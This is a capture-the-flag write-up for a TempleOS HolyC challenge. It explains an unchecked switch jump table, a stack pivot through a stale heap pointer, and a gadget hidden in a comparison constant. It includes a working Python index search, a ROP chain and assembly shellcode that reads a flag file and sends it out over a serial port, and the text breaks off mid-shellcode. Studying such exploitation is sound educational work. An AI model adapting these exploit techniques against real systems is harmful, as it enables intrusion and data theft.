Description  
\-----------

The challenge consists in a TempleOS program written in HolyC, whose source code  
is provided in the FAT filesystem of a QEMU disk (`.qcow2`) where TempleOS is  
also installed. Specifically, [TinkerOS][tinkeros] v5.13 (a distro based on  
TempleOS that is pretty close to the original) is used. Among other things, the  
author of TinkerOS hosts a GitHub pages website at <https://tinkeros.github.io/>  
where TempleOS and TinkerOS documentation is available.

The source code of the challenge can be found in the file  
`/Home/Challenge.HC.Z`, which is in compressed form. TempleOS handles  
compressoin and decompression of files ending with `.Z` transparently, so  
referring to `Challenge.HC` in HolyC programs is the same as referring to  
`Challenge.HC.Z`. The file can be decompressed either by opening it directly in  
the TempleOS text editor inside the VM, or mounting the QEMU disk, extracting it  
and manually decompressing it using third party tools  
([example](<https://github.com/aarzilli/templestuff>)). TempleOS compiles HolyC  
code on the fly, and the challenge source is included by `/Home/Once.HC.Z`,  
which is executed immediately after the VM starts (similar to `~/.profile` on  
Linux systems).

One important thing to note is that TempleOS uses 4-level page tables, but only  
because it needs to set up paging to run in x86 64-bit long mode. Virtual  
addresses are identity mapped to the same physical addresses and all memory is  
RWX. There is no separation of privileges and everything runs in ring 0: kernel  
code, compiler, any program we write and run.

The challenge program communicates with the outside through serial port 1 (COM1,  
0x3f8), which is exposed by QEMU via TCP. It presents a menu interface which  
allows to play with a few silly Bible-related functionalities (TempleOS comes  
with an embedded `Bible.TXT` and a bunch of functions to extract verses and  
other info from it):

```none  
### ... huge ASCII art banner ... ###

What do you want to do?  
1) Read a book from the Bible  
2) Look up a Bible book and verse by line  
3) Choose a random Bible verse for me  
4) Let God generate a passphrase for me  
666) Commit a sin  
>  
```

The functionalities implemented by the program are all more or less useless for  
exploitation purposes and are just decorative, so I won't be describing  
them in detail, but you can check  
[the source code](<https://github.com/mebeim/ctf-challenges/blob/e0c62b42c3d37d7e928b4ad7e235474cd69f8984/challenges/holym0le/src/files/IsoRoot/InstallHome/Challenge.HC>) itself, which  
should be easy to understand. I will only talk about the few bits of useful code  
later on as needed.

Bug  
\---

There is only one subtle bug in the whole program, which may not be obvious only  
looking at the source code. It comes from the incorrect usage of the special  
HolyC `switch [] {...}` statement syntax.

In the `DoCommand` function, a decimal signed integer in stirng form is read  
from COM1 and converted to a 64-bit signed integer by the `RecvI64()` helper  
function. The following `switch` is then executed:

```c  
U0 DoCommand() {  
U8 *book;  
I64 n;

SendString(menu);  
n = RecvI64();

/* ... */

switch [n] {  
case 1:  
/* ... */  
break;  
case 2:  
/* ... */  
break;  
/* ... */  
default:  
/* ... */  
break;  
}

SendString("---\n");  
}  
```

The special syntax `switch [n] {...}` with **square brackets** instead of normal  
parentheses (`switch (n) {...}`) is a HolyC-specific construct that instructs  
the compiler to *avoid performing any bound checking on the value* being  
switched on. This is only safe if the `case` statements inside the `switch`  
cover all possible values. Even with a `default` statement, no bound checking is  
performed! Looking at the challenge source code, the only values explicitly  
handled by `case` statements are `1`, `2`, `3`, `4` and `666`.

Extracting the compiled code is a bit tricky because the functions from  
`Challenge.HC` are already compiled and loaded into memory, and we cannot  
interact with the terminal of the process that is running the challenge. There  
are a few easy ways to get around this:

1\. Edit the `Challenge.HC` file with the text editor (`Ed("Challenge.HC");`) in  
another terminal and then `Reboot;` the machine to run the modified versoin.  
Adding `Uf("DoCommand");` at the end of the file will dump the disassembly of  
the `DoCommand` function in the terminal.  
2\. Include `Challenge.HC` in another terminal and then dump the code (again with  
either `Uf()` or some of its variants).  
3\. Crash the challenge with a large invalid value for `n` and let TempleOS  
automatically launch its integrated debugger, where we can then inspect  
functions and dump memory more or less like we would in a normal terminal.

In any case, disassembling the function yields the following:

![disassembled DoCommand](<https://github.com/mebeim/ctf-challenges/blob/e0c62b42c3d37d7e928b4ad7e235474cd69f8984/challenges/holym0le/writeup/screen01.png>)

If we take a look at the `switch` statement, we can see it is compiled as a jump  
with lookup in a jump offset table that is indexed using the switch value  
without any bound checking:

![disassembled switch statement](<https://github.com/mebeim/ctf-challenges/blob/e0c62b42c3d37d7e928b4ad7e235474cd69f8984/challenges/holym0le/writeup/screen02.png>)

Dumping the address of the function with `"%x\n", &DoCommand;` (equivalent to  
`Print("%x\n", &DoCommand);`) we can also look at the code via GDB or QEMU  
monitor using `x/100i <addr>`:

```none  
/* RSI holds n */  
0x3677bd35: movsx rbx,WORD PTR [rsi*2+0x3677bf0b]  
0x3677bd3e: add ebx,0x3677bd46  
0x3677bd44: jmp rbx  
```

The RSI register holds the `I64 n` variable we are switching over. As we can  
see, a 2-byte signed offset is extracted from a jump offset table that starts at  
`0x3677bf0b` and then added to the base address `0x3677bd46` to calculate the  
final jump destination.

The jump offset table itself has 667 entries to cover values from `0` to `666`.  
All entries hold offsets that point to code for the `default` statement, except  
the ones for the implemented `case` statements which hold offsets pointing to  
the right piece of code within `DoCommand()`. Anything outside the [`0`,`666`]  
range will make the program *access the jump offset table out of bounds* and  
pick an unexpected 16-bit signed integer from wherever we want (we have a 64-bit  
value that we can use as index, so we can read from anywhere in memory).

Solution  
\--------

Even though the compilation is done just-in-time at boot when `Challenge.HC` is  
included, the TempleOS compiler almost always chooses the same address for the  
`DoCommand()` function, so we know the position of the function, the jump offset  
table within the function, and the base address of the `switch` jump.

Given an arbitrary `n` as input, we can choose a 16-bit signed offset from  
anywhere in memory, giving us limited RIP control: we can jump anywhere within  
signed 16-bit distance from the base `switch` jump address of `0x3677bd46`.

### The path to RIP control

The only place in the whole program where we can input a significant amount of  
data is the command number `1`:

```c  
U0 DoCommand() {  
U8 *book;  
I64 n;

SendString(menu);  
n = RecvI64();

/* ... */

switch [n] {  
case 1:  
SendString("Which book? ");  
RecvLine(&book, 150); // <======

SendString("How many lines? ");  
n = RecvI64();

if (n < 1) {  
SendString("Cannot really read less than 1 line!\n");  
Free(book);  
break;  
}  
if (n > 50) {  
SendString("I'm afraid we don't have that much time!\n");  
Free(book);  
break;  
}

CmdReadBook(book, n);  
Free(book);  
break;

/* ... */  
}  
```

Command 1 calls `RecvLine(&book, 150)`, which allocates a buffer of 150 bytes  
for the caller:

```c  
U0 RecvLine(U8 **out, I64 sz) {  
U8 *p;

if (sz <= 0) {  
*out = NULL;  
return;  
}

p = *out = MAlloc(sz); // <======  
if (p == NULL)  
return;

/* ... */  
}  
```

The `book` variable holds a pointer to a `MAlloc`d buffer and it's the only  
local variable that resides on the stack frame of `DoCommand` (the `Uf()`  
function also tells us this, see first screenshot above).

Can we hijack the `switch` to jump into the buffer allocated via `MAlloc()`? Not  
really. Heap and code are too distant from each other, definitely not within 16  
bits of distance. Furthermore `MAlloc()` does not always return the same  
predictable addresses.

Taking a closer look, the buffer is always correctly `Free`d by `DoCommand()`,  
***however*** the `book` pointer itself is not cleared, and therefore its old  
value stays on the stack. Providing the right input, the rest of the code in  
`DoCommand()` can preserve the old value on the stack without overwriting it  
when pushing function arguments for other calls. If we can somehow jump to some  
code that reads the buffer pointer for us, we may be able to *stack pivot* into  
the buffer.

We can then:

1\. Execute command `1`.  
2\. Provide some payload as "book name".  
3\. Input `0` as the number of lines to read to avoid further functions calls and  
preserve the `book` pointer on the stack.  
4\. Provide some out of bound command value to hijack the `switch` statement in  
the second `DoCommand()` call.

Doing this, we will find ourselves with the stack at the moment of the `JMP RBX`  
looking as follows (output from pwndbg):

```none  
00:0000│ rsp 0x369a20b8 —▸ 0x367aa780 —▸ 0x367b6c28 ◂— 0x367aa780  
01:0008│-010 0x369a20c0 —▸ 0x369a20e0 —▸ 0x369a20f8 —▸ 0x369a21a8 —▸ 0x369a21d8 ◂— ...  
02:0010│-008 0x369a20c8 —▸ 0x37a6c628 ◂— 'AAAAAAAA'  
03:0018│ rbp 0x369a20d0 —▸ 0x369a20e0 —▸ 0x369a20f8 —▸ 0x369a21a8 —▸ 0x369a21d8 ◂— ...  
04:0020│+008 0x369a20d8 —▸ 0x3659fb6f ◂— 0x304d796c6f48f9eb  
```

At RSP+0x10 (RBP-0x08) we have the `book` pointer holding the last book name we  
provided.

### Finding the right gadget

To stack pivot into `book` we have a few options for potential gadgets:

1\. `pop xxx; ...; pop xxx; ...; pop rsp;`  
2\. `add RSP, 0x10; ...; pop rsp`  
3\. `pop xxx; pop xxx; pop rbp; ...; leave; ret`  
4\. or really anything else equivalent...

We can only jump "near" the base address `0x3677bd46` because the jump offset  
is a signed 16-bit integer:

```none  
0x3677bd35: movsx rbx,WORD PTR [rsi*2+0x3677bf0b]  
0x3677bd3e: add ebx,0x3677bd46  
0x3677bd44: jmp rbx  
```

To look for gadgets, we can dump memory in the range [`0x3677bd46 - 0x8000`,  
`0x3677bd46 + 0x7fff`] via QEMU monitor:

```none  
(qemu) memsave 0x36773d46 0x10000 mem.bin  
$ ROPgadget --rawArch x86 --rawMode 64 --rawEndian little --offset 0x36773d46 --binary mem.bin  
```

This doesn't however yield many interesting results... the TempleOS compiler  
does not really like to emit a lot of `pop RBP` nor `pop RSP` it seems. At least  
not close to our code. There may be other useful gadgets that pop the buffer  
address into different registers that then end up being used, but popping it  
straight into RBP or RSP is the easiest thing to do, if possible.

With a bit of manual work and the help of  
[Capstone](<https://pypi.org/project/capstone/>) we can write a simple Python  
script to try and look for more gadgets (see  
[`src/[find_gadgets.py](http://find_gadgets.py)` here](<https://github.com/mebeim/ctf-challenges/blob/e0c62b42c3d37d7e928b4ad7e235474cd69f8984/challenges/holym0le/src/find_gadgets.py>) script) in the dumped code.

As it turns out, there are a few `pop RBP` lying around that look promising.  
They are in the middle of the (rather weird and most definitely not placed there  
on purpose) code at the beginning of `DoCommand()` that checks for a special  
value (using a C integer character constant) to print some seemingly useless  
debug info to the terminal:

```c  
U0 DoCommand() {  
U8 *book;  
I64 n;

SendString(menu);  
n = RecvI64();

if (n >= '[XX]') {  
"$RED$--- [DEBUG] ---\n$FG$";  
"$RED$Task: %s (%s)\n$FG$", Fs->task_name, Fs->task_title;

if (n >= '[XX]' + 1)  
"$RED$Parent: %s (%s)\n$FG$", Fs->parent_task->task_name,  
Fs->parent_task->task_title;  
if (n >= '[XX]' + 2)  
"$RED$Dir: %c://%s\n$FG$", Drv2Let(), Fs->cur_dir;  
if (n >= '[XX]' + 3)  
"$RED$Window: %d %d %d %d\n$FG$", Fs->win_left,  
Fs->win_right, Fs->win_top, Fs->win_bottom;

return;  
}

SendString("---\n");

switch [n] {

/* ... */  
}  
```

The constant `'[XX]'` evaluates to `0x5d58585b`, or `5b 58 58 5d`, which  
disassembled is `pop rbx; pop rax; pop rax; pop rbp;`. The other 3 constants  
just have a different LSB due to the `+` addition and therefore when interpreted  
as code start with a pop into a different register, but all end with the same  
sequence: `pop rax; pop rax; pop rbp;`. The last `if` statement above is  
compiled as:

```none  
0x3677bced: cmp rsi,0x5d58585e  
0x3677bcf4: jl 0x3677be7d  
0x3677bcfa: xor eax,eax  
0x3677bcfc: rex.W push QWORD PTR fs:[rax+0x60]  
/* ... */  
```

Jumping to `0x3677bced + 4`, in the middle of the CMP immediate (`0x5d58585e`  
corresponding to `'[XX]' + 3`) yields the following code:

```none  
0x3677bcf1: pop rax  
0x3677bcf2: pop rax  
0x3677bcf3: pop rbp # POP book pointer into RBP  
0x3677bcf4: jl 0x3677be7d # Not taken  
0x3677bcfa: xor eax,eax  
0x3677bcfc: rex.W push QWORD PTR fs:[rax+0x60]  
0x3677bd01: xor eax,eax  
0x3677bd03: rex.W push QWORD PTR fs:[rax+0x58]  
0x3677bd08: xor eax,eax  
0x3677bd0a: rex.W push QWORD PTR fs:[rax+0x50]  
0x3677bd0f: xor eax,eax  
0x3677bd11: rex.W push QWORD PTR fs:[rax+0x48]  
0x3677bd16: push 0x4  
0x3677bd18: push 0x3677bee7  
0x3677bd1d: call 0x18556  
0x3677bd22: add rsp,0x30  
0x3677bd26: jmp 0x3677be7d # Jump to function epilogue  
<...snip...>  
0x3677be7d: pop rsi  
0x3677be7e: leave # Stack pivot into MAlloc'd buffer  
0x3677be7f: ret  
```

This "gadget" is not so easy to spot because of its length and the unconditional  
JMP to the end of the function, but it does exactly what we want: it pops two  
values from the stack and then pops the `book` pointer into RBP, moving it  
into `RSP` and giving us RIP control with `leave; ret`.

### Calculating the right jump

Now that we have a base address (`0x3677bd46`) and a destination (`0x3677bcf1`)  
we can calculate that the offset needed for the jump is  
`0x3677bcf1 - 0x3677bd46 == -85` (or `0xffab` as unsigned 16-bit integer).

Since we read the jump offset with `movsx rbx,WORD PTR [rsi*2+0x3677bf0b]`, we  
can read from any odd memory address, provided the right value for RSI (`n`).  
One good place to look at is low memory addresses that contain TempleOS kernel  
code, which is fixed as the kernel is a precompiled binary blob and TempleOS  
does not use any kind of address randomization. Another alternative if we don't  
find what we want is to put the 16-bit offset right in the `MAlloc`'d buffer  
itself and guess its location, but that would be less reliable.

```none  
(qemu) memsave 0x0 0x1000000 mem.bin  
```

We can find pretty much any 16-bit offset we want there... we just need a bit of  
math (and luck):

```python  
jump_table = 0x3677bf0b  
jump_base = 0x3677bd46  
target = 0x3677bcf1  
needle = (target - jump_base).to_bytes(2, 'little', signed=True)

# (qemu) memsave 0x0 0x1000000 mem.bin  
mem = open('mem.bin', 'rb').read()

slot_addr = -1  
while 1:  
slot_addr = mem.find(needle, slot_addr + 1)  
assert slot_addr != -1

if (slot_addr - jump_table) % 2 == 0:  
break  
else:  
sys.exit('Failed to find jump table index')

print(hex(slot_addr))  
# 0x115a7

slot_idx = (slot_addr - jump_table) // 2  
print(slot_idx)  
# -456873138  
```

Supplying `-456873138` as index to `DoCommand()` will cause the `switch` to jump  
to `0x3677bd46 + [0x3677bf0b + 2 * -456873138] == 0x3677bcf1`. Right into the  
useful gadget we found.

The strategy is:

1\. Run command `1` and supply a ROP chain when asked for the book title. It will  
be written into a `MAlloc`'d buffer whose address is saved on the stack.  
2\. Input `0` as the number of lines to return exit early from `DoCommand()` and  
preserve the address on the stack, even though the underlying buffer is  
released via `Free()`.  
3\. Input `-456873138` as command to hijack the `switch` and jump to our gadget,  
which will pop the old buffer address into RBP and pivot the stack there.

### ROP chain + shellcode

Now that we successfully control the stack pointer and instruction pointer we  
can run a short ROP chain to locate the new stack (i.e. the `MAlloc`'d buffer  
address) and jump into it to run some shellcode. Alternatively we could invoke  
something like `ReadLine()` to read code into memory and jump into it. As  
already seen in the introduction above, memory protections don't really exist in  
TempleOS so everything is RWX. We have a lot of gadgets at low memory addresses  
(kernel code) so it should be doable.

What I ended up doing was locating the new RSP and then jumping ahead into some  
shellcode.

```python  
payload = flat([  
# Scratch value for LEAVE (goes in RBP)  
0x41414141 ,  
# Pop any valid address in RAX to not crash in the next gadget  
0x000000000000b039, # pop rax ; ret  
stack ,  
# Copy current RSP into RDI  
0x00000000000ea85f, # push rsp ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5e], bl ; pop rdi ; pop rbp ; ret  
0x41414141 ,  
# Calculate address of shellcode  
0x000000000000b039, # pop rax ; ret  
8 * 5 ,  
0x00000000000ca95d, # add edi, eax ; ret  
# Jump into shellcode placed right after this chain in the buffer  
0x00000000000cd540, # push rdi ; ret  
])  
```

All kernel-provided functions are available at low fixed addresses as they are pre-compiled into the kernel binary. We can look them up by name in the  
[TinkerOS documentation](<https://tinkeros.github.io/WbGit/Home/Web/SymsAddress.html#l1>)  
and print their address from any terminal using `"%x\n", &Func;`.

Reading the flag is now only a question of using `FileRead()` (or similar  
functions, like `DocNew()` + `DocRead()` like the challenge itself does) plus a  
simple loop to write to serial. Other alternatives are possible, such as  
guessing or scanning for the location of the `Banner()` function and using it to  
read the file for us either by editing the string embedded in the code holding  
the file name or jumping in the middle of the function with the right stack set  
up.

In our shellcode we have free reign. If we decide to manually perform output, we  
only need to be careful and `Yield()` often enough because TempleOS is *not*  
preemptive and we can end up deadlocking the system. This is not necessarily  
needed, but can significantly improve the stability of the shellcode.

```python  
Yield = 0x105c5  
FileRead = 0x38ccc

payload += asm('''  
/* FileRead("~/Flag.TXT", NULL, NULL); */  
push 0  
push 0  
lea eax, [rip + fname]  
push rax  
mov eax, {FileRead}  
call rax

mov esi, eax  
mov ecx, 100  
mov edi, {Yield}

/* Write to serial carefully one byte at a time. Could also be done with  
* a simple REP OUTSB but that might hang the OS. */  
wait:  
mov dx, 0x3f8 + 5  
in al, dx  
and al, 0x20  
jnz ok  
call rdi  
jmp wait  
ok:  
mov dx, 0x3f8  
mov al, [esi]  
out dx, al  
inc esi  
loop wait

/* Yield to properly flush serial. Again, optional, just to avoid hangs  
* or crashes before we get the data. */
